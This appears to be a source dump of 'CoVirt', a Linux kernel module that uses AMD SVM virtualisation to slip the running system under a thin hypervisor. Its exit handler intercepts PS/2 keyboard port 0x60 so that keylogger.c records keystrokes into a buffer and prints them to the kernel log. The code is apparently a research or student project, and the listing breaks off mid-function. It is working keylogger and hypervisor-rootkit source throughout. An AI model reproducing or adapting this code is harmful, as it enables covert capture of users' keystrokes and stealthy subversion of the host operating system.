+	int PAUSE		: 1;
+	int HLT			: 1;
+	int INVLPG		: 1;
+	int INVLPGA		: 1;
+	int IOIO_PROT	: 1;  // IN/OUT access of selected ports
+	int MSR_PROT	: 1;  // intercept RDMSR/WRMSR access to selected MSRs
+	int TASK_SWITCH	: 1;  // intercept task switches
+	int FERR_FREEZE	: 1;  // intercept processor "frezing" during legacy FERR handling
+	int SHUTDOWN	: 1;  // intercept shutdown events
+} __attribute__((packed)) instr_intercepts_t;
+
+typedef union svm_instr_intercepts {
+	uint32_t val;
+	struct {
+		int VMRUN			: 1; // [0]
+		int VMMCALL			: 1; // [1]
+		int VMLOAD			: 1; // [2]
+		int VMSAVE			: 1; // [3]
+		int STGI			: 1; // [4]
+		int CLGI			: 1; // [5]
+		int SKINIT			: 1; // [6]
+		int RDTSCP			: 1; // [7]
+		int ICEBP			: 1; // [8]
+		int WBN_INST		: 1; // [9] WBINVD + WBNOINVD
+		int MONITOR			: 1; // [10] MONITOR/MONITORX
+		int MWAIT			: 1; // [11] MWAIT/MWAITX Unconditionally
+		int MWAIT_IF_ARMED	: 1; // [12] MWAIT/MWAITX if monitor hardware armed
+		int XSETBV			: 1; // [13]
+		int RDPRU			: 1; // [14]
+		int EFER_WR			: 1; // [15] Write of EFER (occurs after guest instruction finishes)
+		ctrl_reg_t CR_WR; // [16:31] Writes to CR0-15. Isn't this redundant?
+	} __attribute__((packed));
+} __attribute__((packed)) svm_instr_intercepts_t;
+
+typedef struct mm_instr_intercepts {
+	int INVLPGB			: 1; // [0] All INVLPGB Instructions
+	int IL_INVLPGB		: 1; // [1] Invalid INVLPGB Instructions
+	int INVPCID			: 1; // [2]
+	int MCOMMIT			: 1; // [3]
+	int TLBSYNC			: 1; // [4] Presence of this bit indicated by CPUID Fn8000_0000A_EDX[24] = 1
+	int rsvd 			: 27; // [5-31] Reserved, SBZ
+} __attribute__((packed)) mm_instr_intercepts_t;
+
+typedef union tlb_control {
+	char val;
+	struct {
+		int do_nothing 		: 1; // [0] Do nothing
+		int flush_tlb		: 1; // [1] Flush the entire TLB on VMRUN (only use for legacy Hypervisors)
+		int rsvd0			: 1; // [2] Reserved
+		int flush_currrent	: 1; // [3] Flush this guest's TLB entries
+		int rsvd1			: 3; // [4-6] Reserved
+		int flush_non_glob	: 1; // [7] Flush this guest's non-global TLB entries
+	} __attribute__((packed));
+} __attribute__((packed)) tlb_control_t;
+
+typedef struct guest_int_ctrl {
+	int V_TPR		: 8; // Virtual TPR for the guest. [3:0] for the VTPR, [7:4] SBZ
+	int V_IRQ		: 1; // If nonzero, virtual INTR is pending. Written to VMCB @ VMEXIT. Ignored on VMRUN if AVIC enabled.
+	int VGIF		: 1; // (0 - Virtual Intr masked, 1 - Virtual Intr unmasked)
+	int rsvd0		: 6; // Reserved, SBZ
+	int V_INTR_PRIO	: 4; // Priority for virtual interrupt (ignored on VMRUN when AVIC enabled)
+	int V_IGN_TPR	: 1; // If nonzero, the current virtual interrupt ignores the virtual TPR
+	int rsvd1		: 3; // Reserved, SBZ
+	int V_INTR_MASK	: 1; // Virtualizing masking of INTR
+	int AMD_VGIF	: 1; // AMD Virutal GIF Enabled (0 - Disabled, 1 - Enabled)
+	int rsvd2		: 5; // Reserved, SBZ
+	int AVIC_ENABLE	: 1; // AVIC Enable
+	int V_INTR_VEC	: 8; // Vector to use for this interrupt (ignored on VMRUN w/ AVIC Enabled)
+	int rsvd3		: 24; // Reserved, SBZ
+} __attribute__((packed)) guest_int_ctrl_t; 
+
+typedef struct control_area {
+	// 0x000
+	ctrl_reg_t cr_reads;	
+	ctrl_reg_t cr_writes;
+
+	// 0x004
+	debug_reg_t dr_reads;
+	debug_reg_t dr_writes;
+
+	// 0x008
+	excp_vecs_t exception_vectors;
+
+	// 0x00C
+	instr_intercepts_t instr_intercepts;
+
+	// 0x010
+	svm_instr_intercepts_t svm_instr_intercepts;
+
+	// 0x014
+	mm_instr_intercepts_t mm_instr_intercepts;
+
+	// 0x018
+	char rsvd0[36];  // 0x018 - 0x03B reserved
+
+	// 0x03C
+	uint16_t pause_filter_threshold;
+	uint16_t pause_filter_count;
+
+	// 0x040
+	uint64_t IOPM_BASE_PA;  // Physical base addr of IOPM (bits 11:0 ignored)
+	uint64_t MSRPM_BASE_PA; // Physical base addr of MSRPM (bits 11:0 ignored)
+	uint64_t TSC_OFFSET; // Timestamp Counter offset (added to RDTSC + RDTSCP)
+
+	// 0x058 
+	uint32_t guest_asid;
+	tlb_control_t TLB_CONTROL;
+	uint32_t rsvd1 		: 24;
+
+	// 0x060
+	guest_int_ctrl_t guest_int_ctrl;
+
+	// 0x068
+	struct guest_int_shadow_mask {
+		int interrupt_shadow 		: 1; // Guest is in an interrupt shadow
+		int guest_interrupt_mask	: 1; // Valud of RFLAGS.IF bit for the guest. Written back to VMCB on VMEXIT.
+		uint64_t rsvd2				: 62; // Reserved, SBZ
+	} __attribute__((packed)) gisw;
+
+	// 0x070
+	int64_t EXIT_CODE;
+	uint64_t EXIT_INFO1;
+	uint64_t EXIT_INFO2;
+	uint64_t EXIT_INT_INFO; // TODO: Struct for this
+
+	// 0x090
+	// I want a struct for this but idk if they're all even related... >:(
+	struct misc_enable {
+		int NP_Enable 			: 1; // Enable Nested Paging
+		int SEV_Enable			: 1; // Enable Secure Encrypted Virtualization (SEV)
+		int Encrypt_SEV_Enable	: 1; // Enable Encrypted State for SEV
+		int GM_Execute_Trap		: 1; // Guest Mode Execute Trap (huh?)
+		int SSSCheckEn			: 1; // Enable Supervisor Shadow Stack restrictions in Nested PTs. CPUID Fn8000_000A_EDX[19]
+		int Virt_Trans_Encr		: 1; // Virtual Transparent Encryption
+		int rsvd3 				: 1; // Reserved, SBZ
+		int INVLPGB_TLBSYNC_EN	: 1; // Enable INVLPGB + TLBSYNC (If 0 -> #UD on instruction call)
+		uint64_t rsvd4			: 56; // Reserved, SBZ
+	} __attribute__((packed)) misc_enable;
+
+	// 0x098
+	struct avic_apic_bar {
+		uint64_t AVIC_APIC_BAR	: 52; // AVIC APIC BAR (idk what this is either) 
+		uint64_t rsvd5			: 12; // I do know that this is reserved, sbz tho!
+	} __attribute__((packed)) avic_apic_bar;
+	// 0x0A0
+	uint64_t GHCB_PA; // Guest Physical Address of GHCB
+	uint64_t EVENTINJ; // Event Injection 
+	uint64_t N_CR3; // Nested page table CR3 to use for nested paging
+
+	//0x0B8
+	struct more_virt_enable_stuff {
+		int LBR_VIRT_ENABLE		: 1; // 1 - Enable LBR Virtualization hardware acceleration
+		int VIRT_SAVE_LOAD		: 1; // 1 - Enable Virtualized VMSAVE/VMLOAD
+		uint64_t rsvd6			: 62; // Reserved, SBZ
+	} __attribute__((packed)) more_ves;
+
+	// 0x0C0
+	uint32_t clean_bits;
+	uint32_t rsvd7;
+
+	// 0x0C8
+	uint64_t nRIP; // Next sequential instruction pointer
+
+	// 0x0D0 (wtf is this)
+	struct inst_fetch_info {
+		uint8_t num_bytes_fetched;
+		uint8_t guest_instruction_bytes[15]; 
+	} __attribute__((packed)) instr_fetch_info;
+
+	//0x0E0
+	struct apic_info {
+		uint64_t APIC_BACKING_PAGE_PTR	: 52;
+		uint64_t rsvd99					: 12;
+	} __attribute__((packed)) apic_info;
+
+	//0x0E8
+	char rsvd8[8];
+
+	// 0x0F0
+	struct avic_log_info {
+		uint64_t rsvd9					: 12;
+		uint64_t AVIC_LOGICAL_TABLE_PTR : 40; 
+		uint64_t rsvd10					: 12;
+	} __attribute__((packed)) avic_log_info;
+
+	// 0x0F8
+	struct avic_phys_info {
+		uint64_t AVIC_PHYS_MAX_IDX		: 8;
+		uint64_t rsvd11					: 4;
+		uint64_t AVIC_PHYS_TABLE_PTR	: 40;
+		uint64_t rsvd12					: 12;
+	} __attribute__((packed)) avic_phys_info;
+	// 0x100
+	uint64_t rsvd13;
+
+	// 0x108
+	struct vmsa_info{
+		uint64_t rsvd14					: 12;
+		uint64_t VMSA_PTR				: 40;
+		uint64_t rsvd15					: 12;
+	} __attribute__((packed)) vmsa_info;
+
+	// 0x110 - 0x3DF Reserved, SBZ
+	char rsvd16[720];
+
+	// 0x3E0 - 0x3FF
+	// RESERVED FOR HOST
+	char rsvd17[VMCB_CTRL_AREA_SIZE - 0x3E0];
+} __attribute__((packed)) control_area_t;
+
+typedef struct segment {
+	uint16_t selector;
+	uint16_t attrib;
+	uint32_t limit;
+	uint64_t base;
+} __attribute__((packed)) segment_t;  // I need a better name for this...
+
+typedef struct state_save_area {
+		segment_t es;
+		segment_t cs;
+		segment_t ss;
+		segment_t ds;
+		segment_t fs;
+		segment_t gs;
+		segment_t gdtr;  // Selector + Attrib Reserved. Only lower 16 bits for Limit.
+		segment_t ldtr;  
+		segment_t idtr;  // Selector + Attrib Reserved. Only lower 16 bits for Limit.
+		segment_t tr;
+		
+		char rsvd0[43];  // 43 bytes reserved
+
+		char cpl;
+
+		char rsvd1[4];  // 4 bytes reserved
+		
+		uint64_t efer;  // TODO: Somewhere, make a struct for efer
+
+		char rsvd2[112];  // 112 bytes reserved
+		
+		// TODO: we'll want structs for all of these as well
+		uint64_t cr4;
+		uint64_t cr3;
+		uint64_t cr0;
+		uint64_t dr7;
+		uint64_t dr6;
+		uint64_t rflags;
+		uint64_t rip;
+
+		char rsvd3 [88];  // 88 bytes reserved
+		
+		uint64_t rsp;
+		uint64_t s_cet;
+		uint64_t ssp;
+		uint64_t isst_addr;
+		uint64_t rax;
+		uint64_t star;
+		uint64_t lstar;
+		uint64_t cstar;
+		uint64_t sfmask;
+		uint64_t kernel_gs_base;
+		uint64_t sysenter_cs;
+		uint64_t sysenter_esp;
+		uint64_t sysenter_eip;
+		uint64_t cr2;
+
+		char rsvd4[32];  // 32 bytes reserved
+
+		uint64_t g_pat;
+		uint64_t dbgctl;
+		uint64_t br_from;
+		uint64_t br_to;
+		uint64_t last_excp_from;
+
+		// TODO: Tell AMD their documentation is wrong here lmao.
+		char rsvd5[80];  // 72 bytes reserved
+
+		// 0x2E0
+		uint64_t spec_ctrl;
+
+		// 0x2E8 -> End of VMCB Reserved
+		char rsvd_to_end[VMCB_SIZE - (0x2E8 + VMCB_SS_AREA_OFFSET)];
+} __attribute__((packed)) state_save_area_t;
+
+
+typedef struct vmcb {
+	// VMCB divided into two areas.
+	// Control Area: control bits
+	// State Save Area: saved guest state
+
+	// Control Area at offset 0x00 from start of VMCB
+	control_area_t control_area;
+	
+	// State Save Area at offset 0x400 from start of VMCB
+	state_save_area_t state_save_area;
+	
+	// This SEV_ES may be an issue...
+
+} __attribute__((packed)) vmcb_t;
+
+
+/*
+	VMCB Function Declarations
+*/
+
+phys_addr_t vmcb_init(uint64_t rip, uint64_t rsp, uint64_t rax, uint64_t rflags);  // Will perform all set up for the VMCB and return its physical address.
+
+void debug_vmcb(vmcb_t * vmcb);  // Print out the VMCB contents
+
+void check_entry_offset(uint16_t offset, uint64_t e_ptr, char * name);
+
+void consistency_checks(void);
+
+void set_exit_reasons(void);
+
+segment_t format_segment(uint64_t descriptor, uint16_t selector);
+```
+
+`covirt/src/apic.c`:
+
+```c
+#include <linux/kernel.h>
+#include <asm/io.h>
+
+#include "apic.h"
+#include "reg_utils.h"
+
+
+// APIC MSR
+#define APIC_BASE_MSR 	0x01b				// Base Address MSR
+#define APIC_BASE_MASK 	0xFFFFFFFFFF << 12  // Base Address Mask (for APIC only)
+#define APIC_BSC_MASK	0x1 << 8			// Is this the Bootstrap Core
+#define APIC_EN_MASK	0x1 << 11			// APIC enabled
+#define x2APIC_ENABLE	0x1 << 10			// x2APIC enabled
+
+#ifdef DEBUG_ENABLED
+# define DEBUG_PRINT(...) printk(__VA_ARGS__)
+#else
+# define DEBUG_PRINT(...) do {} while (0)
+#endif
+
+void __iomem * mapped;
+
+struct apic_ba_reg get_apic_info(void){
+	struct apic_ba_reg bar;
+	uint64_t bar_raw;
+	bar_raw = read_msr(APIC_BASE_MSR);
+	bar.base_addr = bar_raw & APIC_BASE_MASK;
+	bar.bsc = !!(bar_raw & APIC_BSC_MASK);
+	bar.enabled = !!(bar_raw & APIC_EN_MASK);
+	bar.x2apic = !!(bar_raw & x2APIC_ENABLE);
+	return bar;
+}
+
+void print_apic_info(void){
+	struct apic_ba_reg bar;
+	bar = get_apic_info();
+	phys_addr_t base_addr = bar.base_addr;
+	DEBUG_PRINT("xAPIC base address: %llx\n", bar.base_addr);
+	DEBUG_PRINT("Is bootstrap core: %x\n", bar.bsc);
+	DEBUG_PRINT("Is APIC Enabled: %x\n", bar.enabled);
+	DEBUG_PRINT("Is x2APIC Enabled: %x\n", bar.x2apic);
+	
+}
+
+uint64_t get_current_isrs(void){
+	// APIC offsets 100h-170h
+	int i = 0;
+	for (i = 0; i < 8; i++){
+		DEBUG_PRINT("ISR %x: 0x%x\n", i, ioread32(mapped + 0x100 + (0x10 * i)));
+	}
+	return 0;
+}
+
+uint64_t get_current_irrs(void){
+	// APIC offsets 100h-170h
+	int i = 0;
+	for (i = 0; i < 8; i++){
+		DEBUG_PRINT("IRR %x: 0x%x\n", i, ioread32(mapped + 0x200 + (0x10 * i)));
+	}
+	return 0;
+}
+
+uint16_t is_timer_interrupt(void){
+	uint32_t reg7 = ioread32(mapped + 0x270);
+	if (reg7 & (0x1 << 12)){
+		return 1;
+	}
+	return 0;
+}
+
+void setup_apic_mapping(void){
+	struct apic_ba_reg bar;
+	bar = get_apic_info();
+	phys_addr_t base_addr = bar.base_addr;
+
+	mapped = ioremap(base_addr, 0x8);
+	return;
+}
+```
+
+`covirt/src/covirt_module.c`:
+
+```c
+#include <linux/init.h>
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/slab.h>
+#include <linux/delay.h>
+
+#include "svm_utils.h"
+#include "reg_utils.h"
+#include "apic.h"
+
+#ifdef DEBUG_ENABLED
+# define DEBUG_PRINT(...) printk(__VA_ARGS__)
+#else
+# define DEBUG_PRINT(...) do {} while (0)
+#endif
+
+// Defined as globals for now, this is where we'll store the additional guest + host states
+void * __global_Host_Reg_Store; 
+void * __global_Guest_Reg_Store;
+void * __global_VMCB_VA;
+phys_addr_t __global_VMCB_PA;
+phys_addr_t __global_VM_HSAVE_PA;
+uint64_t * __global_keylogger_counter;
+char * __global_keylogger_buffer;
+
+extern void VM_Setup_and_Run(void);
+
+static int __init test_init(void) 
+{
+
+	// TODO: find a way to organize this so it works w/ the guest RIP nicely (if that even matters idk)
+	// Needs to do these for all CPUs
+	svm_check(); // Return 0 if SVM possible
+	enable_svm(); // Return 0 on success
+	init_vm_hsave_pa();
+	setup_apic_mapping(); // Just some APIC stuff
+	
+	__global_keylogger_counter = kzalloc(8, GFP_KERNEL);
+	__global_keylogger_buffer = kzalloc(128, GFP_KERNEL);
+	__global_Host_Reg_Store = kzalloc(128, GFP_KERNEL);  // only need like 128 bytes for now
+	__global_Guest_Reg_Store = kzalloc(128, GFP_KERNEL);  // only neeed like 128 bytes for now
+
+	// NOTE: do not use mdelay(), it causes Kernel Panic, idk why.
+	// mdelay busy waits, preventing other tasks from running
+	// msleep doesn't busy wait
+	//msleep(3000);
+
+	VM_Setup_and_Run();	
+
+	// Why is this printing twice?
+	DEBUG_PRINT("IN GUEST: Hi, we're here!\n");
+	return 0;
+}
+
+static void __exit test_exit(void)
+{
+	DEBUG_PRINT("Goodbye World\n");
+}
+
+
+module_init(test_init);
+module_exit(test_exit);
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Nadharm Dhiantravan");
+MODULE_DESCRIPTION("CoVirt :D");
+MODULE_VERSION("0.0");
+
+```
+
+`covirt/src/exit_handle.c`:
+
+```c
+#include <linux/kernel.h>
+#include <asm/io.h>
+
+#include "exit_handle.h"
+#include "vmcb.h"
+#include "svm_utils.h"
+#include "apic.h"
+#include "keylogger.h"
+
+#ifdef DEBUG_ENABLED
+# define DEBUG_PRINT(...) printk(__VA_ARGS__)
+#else
+# define DEBUG_PRINT(...) do {} while (0)
+#endif
+
+extern void * __global_Host_Reg_Store; 
+extern void * __global_Guest_Reg_Store;
+extern void * __global_VMCB_VA;
+extern phys_addr_t __global_VMCB_PA;
+
+void handle_vmexit(void){
+	vmcb_t * vmcb = (vmcb_t *) __global_VMCB_VA;
+	uint64_t exitcode = (uint64_t) vmcb->control_area.EXIT_CODE;
+	//DEBUG_PRINT("Hit exit handler....\n");
+    // DEBUG_PRINT("EXIT CODE: 0x%llx\n", exitcode);
+    // DEBUG_PRINT("EXIT INFO1: 0x%llx\n", vmcb->control_area.EXIT_INFO1);
+    // DEBUG_PRINT("EXIT INFO2: 0x%llx\n", vmcb->control_area.EXIT_INFO2);
+    // DEBUG_PRINT("EXIT INT INFO: 0x%llx\n", vmcb->control_area.EXIT_INT_INFO);
+
+	switch(exitcode){
+		case VMEXIT_IOIO:
+            handle_ioio();
+			break;
+		case VMEXIT_INTR:
+			handle_phys_int();
+			break;
+		case VMEXIT_CPUID:
+			handle_cpuid();
+			break;
+		case VMEXIT_RDTSC:
+			DEBUG_PRINT("RDTSC Instruction Intercept\n");
+			// This is just a test:
+			vmcb->state_save_area.rax = 0xdeadbeef;
+			vmcb->control_area.instr_intercepts.RDTSC = 0;
+			debug_vmcb(vmcb);
+			break;
+        case VMEXIT_EXCP14:	/* Page fault */
+		    break;
+        case VMEXIT_CR0_READ:
+            //do_cr0_read();//next step to finish the handler
+            break;
+        case VMEXIT_CR0_WRITE:
+            break;
+        case VMEXIT_CR3_READ:
+            break;
+        case VMEXIT_CR3_WRITE:
+            break;
+        case VMEXIT_CR4_READ:
+            break;
+        case VMEXIT_CR4_WRITE:
+            break;
+        case VMEXIT_INVLPG:
+            break;
+        case VMEXIT_TASK_SWITCH:
+            break;
+        case VMEXIT_MSR:
+            break;
+        case VMEXIT_NPF:
+            break;
+        case VMEXIT_VMMCALL:
+            break;
+        case VMEXIT_INIT:
+            break;
+        case VMEXIT_NMI:
+            break;
+        case VMEXIT_CLGI:
+            break;
+        case VMEXIT_STGI:
+            break;
+        case VMEXIT_VMRUN:
+            break;
+        case VMEXIT_INVLPGA:
+            break;
+		default:
+			// We better not hit this
+			break;
+	}
+	
+	// If the exit was caused by an instr_interrupt
+	// if(exitcode >= 0x65 && exitcode <= 0x7f){
+	// 	vmcb->state_save_area.rip = vmcb->control_area.nRIP;
+	// }
+
+	vmcb->control_area.EXIT_CODE = 0;
+	vmcb->control_area.EXIT_INFO1 = 0;
+	vmcb->control_area.EXIT_INFO2 = 0;
+	vmcb->control_area.EXIT_INT_INFO = 0;
+
+	return;	
+}
+
+void handle_phys_int(void){
+    vmcb_t * vmcb = (vmcb_t *) __global_VMCB_VA;
+    // get_current_irrs();
+    // get_current_isrs();
+    DEBUG_PRINT("Handling phys int..");
+    if(is_timer_interrupt()){
+        vmcb->control_area.guest_int_ctrl.V_INTR_PRIO = 4;
+        vmcb->control_area.guest_int_ctrl.V_INTR_VEC = 236;
+        vmcb->control_area.guest_int_ctrl.V_IRQ = 1;
+        vmcb->control_area.EVENTINJ = 236 + (0 << 8) + (0 << 11) + (1 << 31);
+    } else {
+        DEBUG_PRINT("Holy crap, not a timer interrupt\n");
+    }
+    return;
+}
+
+/*
+    Obviously the handler for IO stuff
+    Implementation only works with keyboard IO rn.
+    Port = 0x60 (data) for PS/2 Keyboard
+
+    This is basically the keylogger
+*/
+
+void handle_ioio(void){
+    vmcb_t * vmcb = (vmcb_t *) __global_VMCB_VA;
+    uint64_t ecode = vmcb->control_area.EXIT_CODE;
+    uint64_t einfo1 = vmcb->control_area.EXIT_INFO1;
+    uint64_t einfo2 = vmcb->control_area.EXIT_INFO2;
+
+    // Decoding EXITINFO1
+    int io_type = einfo1 & 0x1;    // 1 = Read, 0 = Write
+    int str_based = einfo1 & (0x1 << 2);  // (INS, OUTS)
+    int op_size;    // Operand Size
+    int addr_size;  // N-bit Address
+    int port_num;   // Intercepted I/O Port
+
+    if (einfo1 & (0x1 << 4)){
+        op_size = 8;
+    } else if (einfo1 & 0x1 << 5) {
+        op_size = 16;
+    } else {
+        op_size = 32;
+    }
+    
+    if (einfo1 & (0x1 << 7)){
+        addr_size = 16;
+    } else if (einfo1 & 0x1 << 8) {
+        addr_size = 32;
+    } else {
+        addr_size = 64;
+    }
+
+    port_num = einfo1 & (0xFFFF << 16);
+
+    // "DECODING" EXITINFO2
+    uint64_t next_instruction = einfo2;
+
+    // IO Read (IN)
+    if (io_type == 1){
+        char val = inb(0x60);
+        vmcb->state_save_area.rax = (uint64_t) val;
+        keylog_char(val);
+    }    
+
+    // IO Write (OUT) 
+    else {
+        char val = (char)(vmcb->state_save_area.rax & 0xFF);
+        outb(val, 0x60);
+    }
+
+    vmcb->state_save_area.rip = next_instruction;
+    return;
+}
+
+
+void handle_cpuid(void){
+	vmcb_t * vmcb = (vmcb_t *) __global_VMCB_VA;
+    uint32_t operation = vmcb->state_save_area.rax & 0xffffffff;
+    DEBUG_PRINT("CPUID Instruction Intercept\n");
+    if (operation == 0x00000000){
+        vmcb->state_save_area.rax = 0xffffffff;
+        *(uint64_t *)(__global_Guest_Reg_Store + 32) = 0x20796548;
+        *(uint64_t *)(__global_Guest_Reg_Store + 40) = 0x72656854;
+        *(uint64_t *)(__global_Guest_Reg_Store + 48) = 0x293A2065;
+    }
+    
+    vmcb->state_save_area.rip = vmcb->control_area.nRIP;
+    return;
+}
+
+
+
+```
+
+`covirt/src/io.c`:
+
+```c
+#include <linux/slab.h>
+
+#include "io.h"
+
+#ifdef DEBUG_ENABLED
+# define DEBUG_PRINT(...) printk(__VA_ARGS__)
+#else
+# define DEBUG_PRINT(...) do {} while (0)
+#endif
+
+void * setup_iopm(void){
+    void * iopm_va = (void *)kzalloc(0x3000, GFP_KERNEL);
+    
+    // Intercept IO on 0x60 (Only keyboard information)
+	*((uint8_t *)iopm_va + 12) = 0x1;  
+
+	DEBUG_PRINT("IOPM BASE VA: %llx\n", iopm_va);
+    return iopm_va;
+}
+```
+
+`covirt/src/keylogger.c`:
+
+```c
+#include <linux/kernel.h>
+#include <linux/string.h>
+
+#include "keylogger.h"
+
+#ifdef DEBUG_ENABLED
+# define DEBUG_PRINT(...) printk(__VA_ARGS__)
+#else
+# define DEBUG_PRINT(...) do {} while (0)
+#endif
+
+extern uint64_t * __global_keylogger_counter;
+extern char * __global_keylogger_buffer;
+
+// Credit for this table from https://stackoverflow.com/questions/61124564/convert-scancodes-to-ascii
+// It's not nearly complete, but gets the message across for sure
+char kbd_US [128] =
+{
+    0,  27, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '\b',   
+  '\t', /* <-- Tab */
+  'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n',     
+    0, /* <-- control key */
+  'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '`',  0, '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/',   0,
+  '*',
+    0,  /* Alt */
+  ' ',  /* Space bar */
+    0,  /* Caps lock */
+    0,  /* 59 - F1 key ... > */
+    0,   0,   0,   0,   0,   0,   0,   0,
+    0,  /* < ... F10 */
+    0,  /* 69 - Num lock*/
+    0,  /* Scroll Lock */
+    0,  /* Home key */
+    0,  /* Up Arrow */
+    0,  /* Page Up */
+  '-',
+    0,  /* Left Arrow */
+    0,
+    0,  /* Right Arrow */
+  '+',
+    0,  /* 79 - End key*/
+    0,  /* Down Arrow */
+    0,  /* Page Down */
+    0,  /* Insert Key */
+    0,  /* Delete Key */
+    0,   0,   0,
+    0,  /* F11 Key */
+    0,  /* F12 Key */
+    0,  /* All other keys are undefined */
+};
+
+void keylog_char(char c){
+    uint64_t index = *(__global_keylogger_counter);
+    //DEBUG_PRINT("Index: %d\n", index);
+
+    if ((uint8_t)c > 127){
+        return;
+    }
+    
+    char ascii_char = kbd_US[(uint8_t)c];
+    if ((uint8_t)ascii_char != 0){
+        //DEBUG_PRINT("Logging: %x\n", ascii_char);
+        if (index >= 100){
+            output_keylogger_buf();     // Print out the buffer
+            clear_keylogger_buf();      // Clear the buffer
+            *(__global_keylogger_counter) = 0;      // Set the counter to 0
+        } else {
+            *(__global_keylogger_buffer + index) = ascii_char;
+            *(__global_keylogger_counter) += 1;
+        }
+    }
+    return;
+}
+
+// Clearing the keylogger buffer via setting all its bytes to 0
+void clear_keylogger_buf(void){
+    memset(__global_keylogger_buffer, 0, *__global_keylogger_counter);
+    return;
+}
+
+// This currently just prints out the buffer, but we can make it do other things later
+void output_keylogger_buf(void){
+    printk("\n\nKey Logger Buffer: %s\n\n", __global_keylogger_buffer);
+    return;
+}
+```
+
+`covirt/src/low_level.S`:
+
+```S
+.extern vmcb_init
+.extern handle_vmexit
+
+.extern void * __global_Host_Reg_Store; 
+.extern void * __global_Guest_Reg_Store;
+.extern void * __global_VMCB_VA;
+.extern phys_addr_t __global_VMCB_PA;
+.extern phys_addr_t __global_VM_HSAVE_PA;
+
+#define Save_SVM_Registers(location) 	\
+	pushq	%rax; 				\
+	movq	location, %rax;		\
+	movq	%rdi, (%rax);		\
+	movq	%rsi, 8(%rax);		\
+	movq	%rbp, 16(%rax);		\
+	movq	$0, 24(%rax);		\
+	movq 	%rbx, 32(%rax);		\
+	movq 	%rdx, 40(%rax);		\
+	movq 	%rcx, 48(%rax);		\
+								\
+	movq	%r8, 64(%rax);		\
+	movq	%r9, 72(%rax);		\
+	movq	%r10, 80(%rax);		\
+	movq	%r11, 88(%rax);		\
+	movq	%r12, 96(%rax);		\
+	movq	%r13, 104(%rax);	\
+	movq	%r14, 112(%rax);	\
+	movq	%r15, 120(%rax);	\
+	popq 	%rax;			
+	
+
+#define Restore_SVM_Registers(location) \
+	push	%rax;			\
+	mov	location, %rax;		\
+	mov	(%rax), %rdi;		\
+	mov	8(%rax), %rsi;		\
+	mov	16(%rax), %rbp;		\
+	mov	32(%rax), %rbx;		\
+	mov	40(%rax), %rdx;		\
+	mov 48(%rax), %rcx;		\
+							\
+	mov	64(%rax), %r8;		\
+	mov	72(%rax), %r9;		\
+	mov	80(%rax), %r10;		\
+	mov	88(%rax), %r11;		\
+	mov	96(%rax), %r12;		\
+	mov	104(%rax), %r13;	\
+	mov	112(%rax), %r14;	\
+	mov	120(%rax), %r15;	\
+	pop	%rax;
+
+#define PUSHA				\
+	pushq %rbp;			\
+	pushq %rbx;			\
+	pushq %r8;			\
+	pushq %r9;			\
+	pushq %r10;			\
+	pushq %r11;			\
+	pushq %r12;			\
+	pushq %r13;			\
+	pushq %r14;			\
+	pushq %r15;			
+
+
+#define POPA				\
+	popq %r15;			\
+	popq %r14;			\
+	popq %r13;			\
+	popq %r12;			\
+	popq %r11;			\
+	popq %r10;			\
+	popq %r9;			\
+	popq %r8;			\
+	popq %rbx;			\
+	popq %rbp;			
+
+
+
+.text
+
+.globl VM_Setup_and_Run
+
+VM_Setup_and_Run:
+	Save_SVM_Registers(__global_Guest_Reg_Store)
+	clgi
+
+	pushq %rbp					//
+	movq %rsp, %rbp				//
+
+	// vmcb_init
+	movq 8(%rbp), %rdi			// [Arg 1] Move Saved Return Address to %rdi
+	leaq 8(%rbp), %rsi		// [Arg 2] Move original %rsp to %rsi
+	movq %rax, %rdx				// [Arg 3] Move %rax to %rdx
+	pushfq						// Push RFLAGS
+	popq %rcx					// [Arg 4] Pop RFLAGS into %rcx
+	call vmcb_init				// Initialize the Guest VMCB
+
+	// Take advantage of VMSAVE to store state for us 
+	pushq %rax
+	movq __global_VMCB_PA, %rax
+	vmsave
+	movq __global_VM_HSAVE_PA, %rax
+	vmsave
+	popq %rax
+
+	movq %rbp, %rsp
+	popq %rbp
+run_loop:
+	// VM_HSAVE_PA MSR already setup
+
+	Save_SVM_Registers(__global_Host_Reg_Store);
+
+	Restore_SVM_Registers(__global_Guest_Reg_Store);
+
+	movq __global_VMCB_PA, %rax	// Move the VMCB Physical Address into RAX so VMRUN can use it.
+
+	vmload;
+	vmrun;
+	vmsave;
+	clgi
+exit_stuff:
+
+	// Take advantage of VMSAVE to load the host's saved state
+	pushq %rax
+	movq __global_VM_HSAVE_PA, %rax
+	vmload
+	popq %rax
+
+	Save_SVM_Registers(__global_Guest_Reg_Store);
+
+	Restore_SVM_Registers(__global_Host_Reg_Store);
+
+	call handle_vmexit
+
+	jmp run_loop 
+
+	// We shouldn't hit here I don't think...
+	
+	ret
+
+/*
+
+    Initial Entry(Guest Start Addr): 
+        - Last thing done in module
+    Trampoline:
+        - Initial RIP supplied to Initial Entry()
+        - 
+
+*/
+
+```
+
+`covirt/src/reg_utils.c`:
+
+```c
+#include <linux/kernel.h>
+
+#include "svm_utils.h"
+#include "reg_utils.h"
+// #include "vmcb.h"
+
+#ifdef DEBUG_ENABLED
+# define DEBUG_PRINT(...) printk(__VA_ARGS__)
+#else
+# define DEBUG_PRINT(...) do {} while (0)
+#endif
+
+uint64_t read_msr (uint32_t msr)
+{
+	uint32_t lo, hi;
+	asm volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
+	return (((uint64_t) hi << 32) | lo);
+}
+
+// Might make a wrapper for this
+void write_msr (uint32_t msr, uint32_t hi, uint32_t lo)
+{
+	__asm__ __volatile__ ("wrmsr" : : "d"(hi), "a"(lo), "c"(msr));
+}
+
+uint64_t get_cr0(void)
+{
+	uint64_t cr0;
+	__asm__ __volatile__("mov %%cr0, %0" : "=r"(cr0));
+	return cr0;
+}
+
+uint64_t get_cr2(void)
+{
+	uint64_t cr2;
+	__asm__ __volatile__("mov %%cr2, %0" : "=r"(cr2));
+	return cr2;
+}
+
+uint64_t get_cr3(void)
+{
+	uint64_t cr3;
+	__asm__ __volatile__("mov %%cr3, %0" : "=r"(cr3));
+	return cr3;
+}
+
+uint64_t get_cr4(void)
+{
+	uint64_t cr4;
